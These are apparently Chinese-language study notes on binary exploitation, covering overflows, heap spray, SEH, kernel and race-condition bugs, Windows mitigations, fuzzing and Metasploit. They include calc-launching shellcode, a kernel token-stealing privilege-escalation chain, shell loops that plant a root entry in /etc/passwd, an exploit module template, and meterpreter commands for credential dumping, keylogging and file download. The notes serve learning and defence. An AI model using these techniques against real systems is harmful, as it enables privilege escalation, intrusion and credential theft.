# 概念
* 漏洞: 能导致软件做一些超出设计范围的事情. (漏洞挖掘者一般弹出对话框或calc.exe)
* 0day: 攻击者掌握的, 未被软件厂商修复的漏洞. 
* 1day: 已被厂商发现并修复, 但用户还没打补丁的漏洞. 
* POC代码: Proof of Concept, 证明漏洞的存在或利用漏洞的代码. 
* 漏洞参考网站 
    * cve.mitre.org
    * cert.org
    * blogs.360.cn
    * https://www.anquanke.com/
    * freebuf.com

# 缓冲区溢出
* 根本原因: 冯诺依曼计算机体系未对数据和代码作明确区分

    <img alt="" src="./pic/vul_stack.jpg" width="30%" height="30%">

* shellcode
    1. 将机器码作为字符串保存到变量`sh`(不能包含`\x00`, 这样字符串会被截断, 可以用`xor eax, eax`代替含有操作数0的指令, 以生成0), 注意低位优先的系统中, 每条指令对应的字符串要倒序(如, `call eax` -> `D0FF` -> `"\xFF\xD0"`)
    2. `typedef void (*func)();`
    3. `((func) &sh)();`看shellcode能不能运行. 

    * shellcode例子

        ```x86asm
        mov esp,ebp ; 
		push ebp ;      
		mov ebp,esp ;                      把当前esp赋给ebp 
		xor edi,edi ;
		push edi ;压入0, esp－4,;   作用是构造字符串的结尾\0字符。
		sub esp, 08h
		mov byte ptr [ebp-0ch], 'm'
		mov byte ptr [ebp-0bh], 's'
		mov byte ptr [ebp-0ah], 'v'
		mov byte ptr [ebp-09h], 'c'
		mov byte ptr [ebp-08h], 'r'
		mov byte ptr [ebp-07h], 't'
		mov byte ptr [ebp-06h], '.'
		mov byte ptr [ebp-05h], 'd'
		mov byte ptr [ebp-04h], 'l'
		mov byte ptr [ebp-03h], 'l'
		lea eax, [ebp-0ch]
		push eax    ; 把字符串"msvcrt.dll"的地址压栈
		mov eax, 0x7c801d7b
		call eax    ; 调用LoadLibrary


		xor ebx,ebx
		push ebx
		push 'exe.'
		push 'clac'
		mov eax, esp
		push eax    ; 把'calc.exe'字符串的地址压栈, 作为system函数的参数
		mov eax,0x77bf93c7 ; "\xc7\x93\xbf\x77"
		call eax
		mov eax, 0x7c81cafa ; "\xfa\xca\x81\x7c"
		call eax ; 调用ExitProcess
        ```
    * shellcode的设计
        1. 提取机器码(用vs)
        2. 调试
        3. 通用性(获取调用的api地址)
            * api地址随平台变化
            * 搜索`jmp esp`地址

            <img alt="" src="./pic/vul_stackoverflow_shellcode.jpg" width="50%" height="50%">
            
    * 冲击波漏洞(MS03-26)
        * `CoGetInstanceFromFile(pServerInfo, NULL, 0, CLSCTX_REMOTE_SERVER, STGM_READWRITE, L"C:\\1234561111111111111111111111111.doc", 1, &qi);` 远程和本地均有调用这个接口. 这个调用的文件名参数过长时, 会导致客户端的本地溢出(用`lstrcpyw`拷贝)
        * 在客户端给服务器传递这个参数的时候, 会自动转换为`L"\\servername\c$\1234561111111111111111111111111.doc"`的形式再传递给远程服务器. 在远程服务器的处理中会先取出servername名, 但未做长度检查(给定0x20内存空间). 

# 堆溢出
* 原理
    * windows堆是桶装结构, 相同大小的节点组织在同一条双向链表中
    * 分配内存时, 从双向链表摘下节点: `Node->bp->fp = Node->fp; Node->fp->bp = Node->bp; ` 两次赋值即是攻击者可利用的两次内存写入机会. 

        <img alt="" src="./pic/vul_heapoverflow_unlink.jpg" width="50%" height="50%">
    * 一个漏洞代码示例: 
        ```cpp
        #include <stdio.h>
        #include <malloc.h>
        int main(void) { 
            char *p1 = malloc(Node0);
            strcpy(p1, buf);
            char *p2 = malloc(Node1); // 发生堆溢出攻击
            return 0;
        }
        ```
    * 通过溢出Node1前的节点, 覆盖Node1节点的`bp`字段为`where`值, `fp`字段为`what`值, 于是从双向链表中摘下节点的操作实际变成: `((Node1->where) + 0x0) = (Node1->what); ((Node1->what) + 0x4) = (Node1->where); ` 即 `*where = what; *(what + 4) = where; `

        <img alt="" src="./pic/vul_heapoverflow_1.jpg" width="50%" height="50%">
    
* 利用
    * 覆盖PEB中的字段
        * PEB中的`0x7ffdf020`处保存`RtlEnterCriticalSection`函数的地址
        * 载荷: 填充字节 + shellcode地址 + `\x7f\xfd\xf0\x20`
        * 攻击后的执行链: `RtlEnterCriticalSection` -> shellcode -> `RtlEnterCriticalSection` -> `MessageBox`

# 堆喷射
* 多见于浏览器漏洞
* shellcode存在堆上; 在shellcode前面用0x90(NOP)填充
* 栈溢出将返回地址覆盖为如`0x0c0c0c0c`的值, 执行跳转到该区域后, 会大概率滑行到shellcode

    <img alt="" src="./pic/vul_heapspray_retaddr.jpg" width="50%" height="50%">

# SEH溢出
* SEH原理
    * SEH结构体放在系统栈中
        ```x86asm
            push -0x1
            push <异常处理函数的位置>
            push <下一个SEH的位置>
        ```
    * 线程初始化时, 会自动向栈中安装一个SEH, 作为线程默认的异常处理
    * 若程序源代码使用了`_try{}_except{}`或者`Assert`宏等异常处理机制, 编译器将最终通过向当前函数栈帧中安装一个SEH来实现异常处理. 
    * 异常发生时, 操作系统会中断程序, 并首先从`TEB`的0字节偏移处取出距离栈顶最近的SEH, 使用异常处理函数句柄所指向的代码来处理异常. 异常处理函数运行失败, 则沿着SEH链尝试其它处理函数. 
    * 若程序安装的所有异常处理程序都不能运行, 将运行windows默认异常处理函数(弹出一个弹框提示错误, 然后关闭程序)

        <img alt="" src="./pic/SEH.jpg" width="50%" height="50%">

* 利用: 同栈溢出, 覆盖异常处理函数地址为shellcode地址. 

# 内核漏洞
* 分析过程

    <img alt="" src="./pic/vul_analyze.png" width="50%" height="50%">

* 拒绝服务漏洞
    * `if (MmIsAddressValid(Buffer)) {memcmp(Buffer, buffer2, len);}`
        * `MmIsAddressValid`不可信, 只要Buffer地址处字节在有效页, 下个字节在无效页, len大于1, 则校验通过后, `memcpy`可导致蓝屏. 
* 缓冲区溢出
    * ROP(Return-oriented programming): 对抗DEP保护技术
* 内存篡改
    * 任意地址写任意数据
        * 条件: 驱动中采用NeitherIO通信方式, 且没有校验要写入的地址和要写入的数值. 
            ```cpp
            Type3InputBuffer = pIrpStack->Parameters.DeviceIoControl.Type3InputBuffer;
            UserBuffer = pIrp->UserBuffer;
            // ......
            *(ULONG *)UserBuffer = *(ULONG *)Type3InputBuffer; // Type3InputBuffer处存0, UserBuffer处存HalDispatchTable的地址加4(此处存HalQuerySystemInformation函数的地址)
			IoStatus->Information = sizeof(ULONG);
            ```
        * 过程
            * R3传入一个内核地址, 比如某个表中的函数地址(如`HalDispatchTable`中的`HalQuerySystemInformation`函数)
                * `NtQuerySystemInformation`查询nt模块(`ntoskrnl.exe`)在系统中的载入位置
                * 用`LdrLoadDll`在R3进程中载入nt模块并得到载入的地址, 用`LdrGetProcedureAddress`得到`HalDispatchTable`表的地址, 减去nt模块在本进程中的地址, 得到`HalDispatchTable`相对nt模块头部的偏移
                * 结合上述两个值得到`HalDispatchTable`在系统中的实际偏移, 而该表加4的位置保存`HaliQuerySystemInformation`函数地址
            * R3传入一个任意数据, 比如0, 以及一个任意地址, 如`HalQuerySystemInformation`的在`HalDispatchTable`表中的地址. 这样一来, 利用上述提到的内核漏洞代码, 将篡改`HalDispatchTable`表. 

                ```cpp
                //利用漏洞将HalQuerySystemInformation函数地址改为0
                InputData = 0;
                NtStatus = NtDeviceIoControlFile(
                    DeviceHandle,         // FileHandle
                    NULL,                 // Event
                    NULL,                 // ApcRoutine
                    NULL,                 // ApcContext
                    &IoStatusBlock,       // IoStatusBlock
                    IOCTL_METHOD_NEITHER, // IoControlCode
                    &InputData,           // InputBuffer--->任意数据（0）
                    BUFFER_LENGTH,        // InputBufferLength
                    xHalQuerySystemInformation, // OutputBuffer-->任意地址
                    BUFFER_LENGTH);       // OutBufferLength
                ```
                下图为`HalDispatchTable`表篡改前后: 

                <img alt="" src="./pic/krnl_vul_1.jpg" width="50%" height="50%">

                <img alt="" src="./pic/krnl_vul_2.jpg" width="50%" height="50%">
                
            * 在R3分配一个0地址空间(`NtAllocateVirtualMemory`, win7及以前可用), 并将shellcode拷贝到此内存空间
                * 代码
                    ```cpp
                    ShellCodeAddress = (PVOID)sizeof(ULONG);//4
                    NtStatus = NtAllocateVirtualMemory(
                        NtCurrentProcess(),      // ProcessHandle
                        &ShellCodeAddress,       // 期望内存基址指针(ShellCodeAddress的值是4, 函数调用后, 值变为0). 
                        0,                       // ZeroBits
                        &ShellCodeSize,          // shellcode大小, 4k(一个内存页)
                        MEM_RESERVE | 
                        MEM_COMMIT |
                        MEM_TOP_DOWN,            // AllocationType
                        PAGE_EXECUTE_READWRITE); // Protect可执行, 可读可写

                    //复制Ring0ShellCode到0地址内存中
                    RtlMoveMemory(
                        ShellCodeAddress,
                        (PVOID)Ring0ShellCode,
                        ShellCodeSize);

                    //触发漏洞, 该函数会去HalDispatchTable表找HaliQuerySystemInformation函数, 而经过前面的篡改后这个位置的值已经为0
                    NtStatus = NtQueryIntervalProfile(
                        ProfileTotalIssues, // Source
                        NULL);              // Interval
                    ```

                * shellcode
                    ```cpp
                    NTSTATUS Ring0ShellCode(    
						ULONG InformationClass,
						ULONG BufferSize,
						PVOID Buffer,
						PULONG ReturnedLength)
                    {
                        //打开内核写
                        __asm
                        {
                            cli;    // 屏蔽所有外部中断, 保证程序不被打断
                            mov eax, cr0;
                            mov g_uCr0,eax; 
                            and eax,0xFFFEFFFF; 
                            mov cr0, eax; 
                        }
                        //USEFULL FOR XP SP3
                        __asm
                        {
                            //KPCR 
                            //由于Windows需要支持多个CPU, 因此Windows内核中为此定义了一套以处理器控制区(Processor Control Region)
                            //即KPCR为枢纽的数据结构, 使每个CPU都有个KPCR. 其中KPCR这个结构中有一个域KPRCB(Kernel Processor Control Block)结构, 
                            //这个结构扩展了KPCR. 这两个结构用来保存与线程切换相关的全局信息. 
                            //通常fs段寄存器在内核模式下指向KPCR, 用户模式下指向TEB.
                            //http://blog.csdn.net/hu3167343/article/details/7612595
                            //http://huaidan.org/archives/2081.html
                            mov eax, 0xffdff124  //KPCR这个结构是一个相当稳定的结构,我们甚至可以从内存[0FFDFF124h]获取当前线程的ETHREAD指针。
                            mov eax,[eax] //PETHREAD
                            mov esi,[eax+0x220] //PEPROCESS
                            mov eax, esi
                    searchXp: // 循环, 寻找system进程的EPROCESS结构
                            mov eax,[eax+0x88] //NEXT EPROCESS
                            sub eax,0x88
                            mov edx,[eax+0x84] //PID
                            cmp edx,0x4	//SYSTEM PID
                            jne searchXp
                            mov eax, [eax+0xc8] //SYSTEM TOKEN
                            mov [esi+0xc8],eax //CURRENT PROCESS TOKEN // 提权
                        }
                        //关闭内核写
                        __asm
                        {
                            sti;    // 恢复所有外部中断
                            mov eax, g_uCr0;
                            mov cr0,eax;
                        }

                        g_isRing0ShellcodeCalled = 1;
                        return 0;
                    }
                    ```
                    * 提升进程的权限到system进程: 
                        * 可读SAM, SECURITY等注册表项
                        * 可访问系统还原文件`SYSTEM VOLUME INFORMATION`(要在高级设置中把`隐藏受保护的操作系统文件`的勾去掉)
                        * 可更换系统文件
                        * 可手动杀毒
                    * 恢复内核hook和inlinehook
                    * 添加调用门, 中断门等
    * 固定地址写任意数据
    * 任意地址写固定数据

* linux下的竞争条件漏洞(race condition)
    * 由于多个对象(线程/进程等)同时操作同一资源, 导致系统执行违背原有逻辑设定的行为. 
        * 写多线程程序时, 忘了对共享资源加锁. 
        * 刻舟求剑: 检查某个对象时, 其它线程可能正在改它, 但程序假设这些对象保持不变
    * 属于TOCTTOU(time-of-check-to-time-of-use)
    * 条件
        * 有两个或以上事件, 两个事件间有一定间隔, 且有一定关系(第二个依赖于第一个). 
        * 攻击者能够改变第一个事件所产生的, 为第二个条件所依赖的假设
    * 相关函数
        * `open(file_name, O_CREAT | O_EXCL | O_TRUNC | O_RDWR, 0600)`: 有`O_EXCL`则别的进程无法打开, 否则别的进程可在某漏洞进程打开该文件时同时操作该文件. 
    * 利用
        * 例子1
            * 假设有一个可执行文件(漏洞程序), 其**拥有者是root, 且有`s`权限**. 该程序通过标准I/O流向`/tmp/xyz`文件写入内容
            * 运行如下脚本, 以普通用户身份运行漏洞程序, 循环向程序输入`tom:ttXydORJt50wQ:0:0:,,,:/home:/bin/bash`(这行是要写入`/etc/passwd`文件的, 为tom用户获取管理员权限)

                ```sh
                while true
                do
                    ./vulp < attack_input # attack_input文件中的内容为: tom:ttXydORJt50wQ:0:0:,,,:/home:/bin/bash
                done
                ```
            * 运行如下脚本, 创造链接文件`/tmp/xyz`, 指向`/etc/passwd`, 于是上一步运行的脚本不停向`/etc/passwd`写入内容. 
                ```sh
                    old=`ls -l /etc/passwd`
                    new=`ls -l /etc/passwd`
                    while [ "$old" = "$new" ]
                    do
                        rm -f /tmp/XYZ
                        >/tmp/XYZ
                        ln -sf /etc/passwd /tmp/XYZ
                        new=`ls -l /etc/passwd` 
                    done
                ```
            * 注意
                * 根据 https://www.cxyzjd.com/article/HananoYousei/91364810 中的说法, `sudo sysctl -w fs.protected_symlinks=1` 即可防御攻击(默认即是1, 要完成攻击则需要设为0). 
                * 事先若有tom用户, 脚本直接在`/etc/passwd`末尾加的那一行不起效, 登录tom时仍用原来的那行
                * `set-uid`标志位
                    * 当一个运行的程序拥有该标志位时, 它被假设具有拥有者的权限. 比如, **该程序的拥有者为root, 则任何运行该程序的用户都会获得root权限**. 
                    * `rws`中的`s`即是该标志位. 可以`chmod u+s <目标程序文件>`
        * 例子2: CVE-2014-0196
            * buffer满了(`t->used >= tb->size`)时申请新内存
            * 通过溢出覆盖下一个tty的`tty_struct`中的`*oops`数组中某个函数指针改成shellcode的地址


* double-fetch
    * 用户通常会通过调用内核函数完成特定功能. 当内核函数两次从同一用户地址读取同一数据时, 第一次检查数据有效性(指针验空, 缓冲区大小验证等), 第二次使用数据. 而同时另一用户线程通过创造竞争条件, 在两次内核读取之间对用户数据进行篡改. 

* UAF(use after free)
    * 寻找或生成野指针
        * 引用技术多加或少减, 都会造成引用计数不为0, 然而此时内存已释放, 从而出现野指针. 

* 未初始化漏洞
    * 未初始化指针: 释放一个野指针. 利用成功可获得smbd运行权限
    * 内存分配未初始化: 类似UAF. 分配一块内存后, 没有清零或初始化, 其中可能存在别人留下的恶意代码. 

* OOB(out of bound): 越界访问漏洞
    * 如栈溢出, 堆溢出, 整数溢出, 类型混淆等

# windows安全机制

<img alt="" src="./pic/windows_security.jpg" width="50%" height="50%">

* GS机制

    <img alt="" src="./pic/windows_gs.jpg" width="50%" height="50%">

    * 汇编中会看到函数退出前有`__security_check_cookie`的调用
    * 启用和禁用
        * 启用: 加`/GS`选项, 默认是有的(高版本vs: `C/C++ -> 代码生成 -> 安全检查`)
        * 禁用: 在声明函数时这么写: `__declspec(safebuffers) void fool();`
    * 绕过
        * 未被保护的内存绕过: 不大于4字节的缓存默认不开
        * 覆盖虚函数突破GS
        * SEH攻击突破GS. 
            * [缓冲区][cookie][SEH记录][上一个ebp][返回地址][参数]. 可以覆盖到SEH记录, 然后在检查cookie前触发异常, 并绕过SEH保护. 
            但是在 2003 server, 最新的 xp, vista, win7等高版本中异常处理结构被修改了. 
        * 替换cookie突破: 同时替换.data节和栈中的cookie
            * 前提: 获得任意地址的4字节写入操作权限

* 变量重排

    <img alt="" src="./pic/windows_var_resort.jpg" width="50%" height="50%">

* safeseh
    * 编译时加`/safeseh`选项
    * 编译器会把异常处理函数地址提取出来, 编入一张安全的S.E.H表, 并将这张表放到程序的映像里. 运行时若调用异常处理函数, 会检查其地址是否在S.E.H表中. 
    * `dumpbin /loadconfig <文件名>` 可显示S.E.H表
    * 操作系统是用`RtlDispatchException -> RtlIsValidHandler` 函数来进行有效性验证的. 

* DEP(data execution prevention)
    * 将数据所在内存页标识为不可执行
    * DEP工作状态
        * OptIn: 默认仅将DEP保护应用于Windows系统组件和服务, 对于其它程序不予保护, 但用户可通过应用程序兼容性工具(ACT, Application Compatibility Toolkit)为选定的程序启用DEP, 在Vista下边经过`/NXcompat`选项编译过的程序将自动应用DEP. 这种模式可被应用程序动态关闭, 它多用于普通用户版的操作系统, 如xp, vista, win7. 
        * Optout: 为排除列表外的所有程序和服务启用DEP, 用户可以手动在排除列表中指定不启用DEP保护的程序和服务. 这种模式可被应用程序动态关闭, 多用于服务器版的操作系统(win2003, win2008)
        * 编译设置: `linker -> advanced -> data execution prevention`

* ASLR(address space layout randomization)
    * 需编译器和操作系统双重支持
    * 将进程的模块基址随机化. 
    * ASLR的有效性依赖于整个地址空间布局是否对于攻击者保持未知. 
    * 编译配置: `链接器` -> `高级` -> `随机基址`, 选`/dynamicbase`
    * 映像随机化, 堆栈随机化, PEB, TEB随机化. `jmp esp`这类跳板指令的地址就不好确定了. 
    * 攻击
        * 堆喷射
        * OOB
        * 地址泄露
        * 访问与特定地址关联的数据
        * 针对ASLR实现的缺陷来猜测地址, 常见于系统熵过低或ASLR实现不完善. 
* SEHOP(SEH overwrite protection)
    * 其核心任务是检查seh链的完整性, 在程序转入异常处理前, 检查最后一个异常处理函数是否为系统固定的终极异常处理函数. 
    * 打开
        * 注册表: `\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel`中的`DisableExceptionChainValidation`设置为0

* safeunlink
* heap cookie

    <img alt="" src="./pic/windows_heap_cookie.jpg" width="50%" height="50%">

* 避免缓冲区溢出
    * `strcat, strcpy, sprintf`: 一参`dst`的大小要能把源字符串的结尾'\0'也含进去. 
    * `strncat, strncpy, snprintf`: 比上面的多了第三个参数, 表示要拷贝的字符数
        * `strncpy(dst, src, len)`: 不会向`dst`追加结束标记'\0'
            * len的大小
                * dst长度 > src长度 : strlen(src)
                * dst长度 == src长度 : strlen(src)
                * dst长度 < src长度 : dst的长度 - 1
    * `strcat_s, strcpy_s`: `strcat_s(dst, len, src)`, 但是和`strcat`一样, 遇到结尾'\0'时停止拷贝. 
    * 检查
        * 长度, 边界, 正负
            * 长度校验漏洞例子: 心脏滴血
                * openssl服务端处理心跳请求包时, 没有对客户端发来的length字段(2字节, 可以标志的数据长度是64kB)做合规检测. 源码`memcpy(bp, pl, payload)`中, `payload`为心跳包(心跳类型(1) + 心跳长度(2) + 数据)中的心跳长度, 用户直接传最大payload值, 之后即可发生溢出. 
        * 类型检查
        * NULL指针检查

# fuzz测试
* 流程
    * fuzz工具使程序崩溃
    * 调试分析异常和崩溃位置(windbg, ollydbg, ida, 汇编代码)
    * 匹配漏洞类型
    * exploit
    * 发布poc代码
* fuzz工具流程
    * 生成大量测试用例
    * 把测试用例丢给产品
    * 检测到崩溃或异常
    * 审核崩溃日志, 进行深度解析
* 各种fuzz工具
    * active x fuzz: COMRaider
    * fuzz网络协议: spike
    * 文件类型漏洞
        * smart fuzz: peach
        * blind fuzz: filefuzz
    * ftpfuzz
    * 内核漏洞: ioctl_fuzzer
    * 基于硬件虚拟化 
        * digtool(冰刃实验室)
        * bochspwn(google p0团队)
            * 在vt层监听内存变化

# 二进制插桩和污点分析
* 二进制插桩: 在二进制程序的指定位置插入监控代码, 类似hook
    * 静态插桩(SBI): 对二进制程序进行反汇编, 然后按需添加插桩代码并将更新的二进制程序存入磁盘. 
        * 方法一: 如下. jmp指令有5个字节, 容易破坏小于5个字节的指令. 

            <img alt="" src="./pic/sbi_1.jpg" width="50%" height="50%">

        * 方法二: `int 3`指令, 只有一个字节, 只需用0xcc覆盖某指令的第一个字节. int3产生一个软中断, 操作系统(Linux)产生SIGTRAP信号. 
            * 缺点: int3 这样的软中断速度很慢, 导致插桩后的应用程序的运行开销过大。此外, int3 方法与正在将 int3 作为断点进行调试的程序不兼容. 

        * 方法三: 跳板(trampoline), 创建原始代码的副本, 对副本进行插桩.  
            * 原来的.text节中的代码被转移到新的节, .text节的每个函数头替换成一个jmp指令. 

            <img alt="" src="./pic/sbi_method3.jpg" width="50%" height="50%">
    

    * 动态插桩(DBI): 在程序运行时将新指令插入指令流中(而非注入内存的二进制代码段中), 避免了代码的重定位问题. 
        * DBI计算程序执行了多少基本块(BBL, basic block, 是一个单入口单出口的代码段). 
        * 实现方案为使用 DBI 引擎的API 对每个基本块的最后一条指令进行插桩, 插入回调对基本块递增计数. 
            * DBI引擎从进程中提取代码并插桩. 
            * JIT编译器对插桩后的代码进行优化. 
            * 优化后的代码会放到代码缓存里执行. 

            <img alt="" src="./pic/dbi.jpg" width="50%" height="50%">
        
    * 框架, 项目
        * Inter Pin
            * pin读取和实时编译代码的粒度叫踪迹(trace)
            * 类似基本块, 但只能从顶部进入, 且可能包含多个出口. 
            * Pin 总是以踪迹粒度实时编译代码, 但它支持在多种粒度上插桩代码, 包括指令, 基本块, 踪迹, 函数及映像

        * valgrind
        * github.com/angorafuzzer/libdft64

* 动态污点分析(DTA): 也称数据流追踪(DFT), 通常在动态插桩平台上实现. 
    * 过程: 污点数据(攻击数据)从网络, 磁盘的系统调用或指令进入内存(污点源), 经过移动/拷贝/计算, 到达攻击点(污点槽), 被插桩代码检测到. 


# 工具
## metasploit
* 参考资料
    * [参考文档offensive-security.com](https://www.offensive-security.com/metasploit-unleashed/)
    * ["exploit completed but no session was created"问题](https://www.infosecmatter.com/why-your-exploit-completed-but-no-session-was-created-try-these-fixes/)
* Armitage
    * msf的GUI工具, 使用Java开发. 
    * 启动前需先执行: 
        * 启用postgresql服务
            > service postgresql start
        * 初始化msfdb
            > msfdb init
        * 启动msfconsole并查看数据库连接状态
            > msfconsole
            > db_status
* MSF命令
    * `use <ruby脚本路径>`: 使用模块. 路径是相对于`/use/share/metasploit-framework/modules/exploits`的. 
        * `back`: 退出当前模块
        * `edit exploit/zbh1.rb`: 编辑自定义的ruby脚本
        * `show targets`: 显示目标平台(操作系统)
        * `set target 0`: 选择第0项作为target
        * `show payloads`: 显示可用的shellcode
        * `show options`: 显示配置信息
        * exp常见配置选项: 
            * `set payload <payload路径>`: 设置载荷
                * `windows/exec`: 这个shellcode可执行任意命令
            * `set rhost <目标ip地址>`: 
            * `set rport <目标端口>`: 
            * `set cmd calc`: 配置shellcode待执行的命令为'calc'程序
            * `set exitfunc seh`: 以seh退出程序
        * `exploit`: 发送测试数据, 执行攻击. 
            * `-j`: 
        * `setg loglevel 3`: 设置日志级别为3(可在`~/.msf4/logs/framework.log`中看到详细的错误跟踪)
        * `reload_lib <xxx/xxx.rb>`: 根据文件路径重载某ruby文件
    * `show exploits`: 列出可用EXP模块(包括自己添加的模块)
    * `jobs`: 列出任务 
        * `-k 2-6,7,8,11..15`: 停止任务

    * 开发者命令
        * `edit`: 编辑当前模块或文件
        * `irb`: 打开交互式shell
        * `log`: 显示`framework.log`文件内容
        * `pry`: 在当前模块或框架中打开调试器. 
        * `reload_lib`: 在当前模块或框架中打开调试器. 
        * `time`: 

* meterpreter
    * 账户
        * `getuid`: 
        * `run windows/gather/credentials/windows_autologin`: 抓取自动登录的账号密码
        * `run post/windows/gather/smart_hashdump`: 抓取自动登录的账号密码

* msf模块
    * `auxiliary`: 辅助
    * `exploits`: 渗透
    * `payload`: 载荷
    * `post`: 后渗透

* 自定义模块
    * 定义和加载
        * 例如, 在`~/.msf4/modules/exploits`下新建一个`rb`文件, 自定义一个exploit模块
        * 进入msfconsole后, 改了模块的话, 执行`reload_all`命令重新加载模块. 
        * 进入模块(`use`模块)后可以在编辑后用`reload`重新加载. 
        * 如果加载没有成功, 则打印`~/.msf4/logs/framework.log`查看错误日志. 
    
    * 调试
        * 进入`/usr/share/metasploit-framework`, 执行`bundle config unset frozen`
        * 编辑`Gemfile`, 加一行`gem 'pry-byebug'`
        * 在要分析的地方加一行`binding.pry`, 即加上一个断点. 
        * 如果要进入`exploit`函数调试, 则要在其中打断点, 然后`set payload`设置一个载荷, 然后执行`run`. 
        * 如果要调试框架核心的代码, 需要在修改代码后重新载入文件. 
            * `load`和`require`加载库时搜索的路径保存在`$LOAD_PATH`列表中. 其中用的最多的路径就是msf下的`lib`. 

        * 指令
            * `backtrace`: 栈跟踪
            * `whereami`: 显示当前执行行
            * `up`: 沿着调用栈回溯到上一个调用的上下文
            * `down`: 反之
            * `next`: 执行下一行代码
            * `finish`: 运行至函数返回
            * `continue`: 继续运行
            * `break`: 列出所有断点
                * `break SomeClass#run`: 在`SomeClass#run`方法开始处中断.
                * `break Foo#bar if baz?`: 当`baz?`为true时在`Foo#bar`方法处中断.
                * `break app/models/user.rb:15`: 在`user.rb`的15行设置断点.
                * `break 14`: 在当前文件的第14行设置断点
                * `break --condition 4 x > 2`: 给断点4设置条件.
                * `break --condition 3`: 移除断点3处的条件.
                * `break --delete 5`: 删除断点5.
                * `break --disable-all`: 禁用所有断点
                * `break --show 2`: 打印断点2的详情 
    
    * 自定义exploit示例
        ```rb
        require 'msf/core'

        class Metasploit3 < Msf::Exploit::Remote
            include Exploit::Remote::Tcp

            def initialize(info={})
                super(update_info(info,
                'Name'           => "Code Example",
                'Description'    => %q{
                    This is an example of a module using references
                },
                'License'        => MSF_LICENSE,
                'Author'         => [ 'Unknown' ],
                'References'     =>
                    [
                    [ 'CVE', '2014-9999' ],
                    ['BID', '1234'],
                    ['URL', 'http://example.com/blog.php?id=123']
                    ],
                'Platform'       => 'win',
                'Targets'        => [
                    [ 'Windoes 2000', { 'Ret' => 0x77F8948B } ],
                    [ 'Windoes XP SP2', { 'Ret' => 0x7C914393 } ]
                ],
                'Payload'        => {
                    'Space' => 200,     # 指定生成的payload的最大字节数
                    'BadChars' => "\x00",
                    # 'DisableNops' => true, # 不用nop雪橇
                    # 'MaxNops' => 100, # 限制nop雪橇最大字节数
                },
                'Privileged'     => false,
                'DisclosureDate' => "Apr 1 2014",
                'DefaultTarget'  => 0))

                # 注册选项. 
                register_options([
                    OptBool.new('<参数名>', [false, "<描述>", true]), # 后面列表的三个值分别表示是否必选、描述、初始值
                ])
            end

            def exploit
                connect # 根据设置的ip地址和端口, 连接到目标服务器
                attack_buf = 'a' * 200 + [target['Ret']].pack('V') + payload.encoded # payload在命令中指定; pack('V')是按小端序
                sock.put(attack_buf)
                handler
                disconnect
                # print_debug('Hello, world')
                # datastore['<参数名>']
            end

        end
        ```
        * `payload.raw`: 获取payload的原始字节
    
* 接口
    * 字符相关
        * `pattern_create(<长度>)`: 生成用于定位的字符串
    * Rex模块(Ruby Extension): 
        * 其中包含了msf开发中所需要的功能模块
            * 大部分任务的基本库
            * 处理socket, 协议, 文本转换等
            * SSL, SMB, HTTP, XOR, Base64, Unicode
        * `Rex::Assembly::Nasm`
            * `.assemble(assembly, bits = 32)`: 将汇编代码转为机器码
            * `.disassemble(raw, bits = 32)`: 反汇编

* msfvenom: 整合了msfpayload和msfencode
    * `--list all`: 列出payloads, encoders, nops, platforms, archs, encrypt, formats等所有项的可用选项
    * `-x a.exe`: 以'a.exe'为可执行文件载荷的模板
    * `-b '\x00'`: 指定'\x00'为坏字符(会被编码器消除)
    * `-n <长度>`: 添加nop雪橇
    * `-b `: 
    * `-b `: 
    * `--payload windows/exec CMD=calc.exe 0`: 生成载荷, 'windows/exec'是载荷原型, 后面'CMD=calc.exe'是给参数'CMD'设置值. 0表示直接生成字符串, 可以选'C'等, 得到某一编程语言形式的载荷.

* 后渗透模块
    * `meterpreter`:
        * metasploit的一类载荷, 如`windows/meterpreter/reverse_tcp`
        * 命令
            * `screenshot`: 截屏
            * `sysinfo`: 获取系统运行的平台
            * `ps`: 进程列表
            * `migrate <pid>`: 将会话迁移到某进程空间
            * `run post/windows/capture/keylog_recorder`: 运行键盘记录器
            * `use priv`: 运行在特权账号上
            * `execute -f <文件>`: 在目标机器上运行程序
            * `route`: 查看路由
            * `search -d d:\\ -f *.txt`: 在D盘搜索txt文件
            * `download <文件> <本地目录>`: 从目标机上下载文件到攻击机
            * `upload <文件> <目标机目录>`: 向目标机上传文件
            * `portfwd add -l <本机端口> -r <目标ip> -p <目标端口>`: 将目标机端口映射到本机来
            * ``: 
            * `getuid`: 获取当前用户信息
            * `getsystem`: 提权
    * `post/windows/gather/enum_applications`

* 安裝其他gem包: 在`/usr/share/metasploit-framework`下的Gemfile中, 添加`gem '<要安裝的包名>'`, 安装的包如pry, pry-byebug, pwntools等. 

## immuity dbg
* mona插件
    * `!mona jmp -r esp`: 搜索`jmp esp`指令
        * `-m "kernel32.dll"`: 在指定模块中寻找指令


